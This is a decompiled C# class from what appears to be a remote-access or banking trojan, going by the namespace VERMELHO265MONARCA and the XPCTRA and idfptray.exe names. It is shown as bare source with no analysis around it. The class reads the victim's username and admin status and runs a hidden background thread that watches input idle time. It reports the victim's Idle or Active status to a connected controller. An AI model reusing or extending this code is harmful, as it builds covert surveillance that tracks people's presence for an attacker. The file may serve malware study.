// Decompiled with JetBrains decompiler
// Type: VERMELHO265MONARCA.Core.Helper.WindowsAccountHelper
// Assembly: madre, Version=1.1.2.3, Culture=neutral, PublicKeyToken=null
// MVID: E3E81F5F-5E79-4C7B-AA1D-713B5D376685
// Assembly location: C:\Users\Marcos Abreu\Documents\XPCTRA\idfptray.exe

using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;
using VERMELHO265MONARCA.Core.Networking;
using VERMELHO265MONARCA.Core.Packets.ClientPackets;
using VERMELHO265MONARCA.Enums;
using Xpctra;

namespace VERMELHO265MONARCA.Core.Helper
{
  public static class WindowsAccountHelper
  {
    public static UserStatus LastUserStatus { get; set; }

    public static string GetName()
    {
      return Environment.UserName;
    }

    public static string GetAccountType()
    {
      using (WindowsIdentity current = WindowsIdentity.GetCurrent())
      {
        if (current != null)
        {
          WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
          if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
            return "Admin";
          if (windowsPrincipal.IsInRole(WindowsBuiltInRole.User))
            return "User";
          if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Guest))
            return "Guest";
        }
      }
      return "Unknown";
    }

    public static void StartUserIdleCheckThread()
    {
      new Thread(new ThreadStart(WindowsAccountHelper.UserIdleThread))
      {
        IsBackground = true
      }.Start();
    }

    private static void UserIdleThread()
    {
      while (!xxxxxcliente.Exiting)
      {
        Thread.Sleep(5000);
        if (WindowsAccountHelper.IsUserIdle())
        {
          if ((uint) WindowsAccountHelper.LastUserStatus > 0U)
          {
            WindowsAccountHelper.LastUserStatus = UserStatus.Idle;
            new SetUserStatus(WindowsAccountHelper.LastUserStatus).Execute((Client) Program.ConnectClient);
          }
        }
        else if (WindowsAccountHelper.LastUserStatus != UserStatus.Active)
        {
          WindowsAccountHelper.LastUserStatus = UserStatus.Active;
          new SetUserStatus(WindowsAccountHelper.LastUserStatus).Execute((Client) Program.ConnectClient);
        }
      }
    }

    private static bool IsUserIdle()
    {
      long num = Stopwatch.GetTimestamp() - (long) NativeMethodsHelper.GetLastInputInfoTickCount();
      return (num > 0L ? num / 1000L : 0L) > 600L;
    }
  }
}
